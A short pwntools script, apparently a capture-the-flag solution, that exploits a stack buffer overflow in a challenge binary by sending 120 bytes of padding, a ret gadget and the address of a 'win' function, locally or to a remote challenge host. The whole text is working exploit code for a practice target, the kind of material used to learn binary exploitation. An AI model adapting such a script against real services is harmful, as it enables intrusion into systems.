from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=18774
else:
   pass

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()

chain = cyclic(120)
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(e.sym['win'])
p.sendline(chain)
p.interactive()
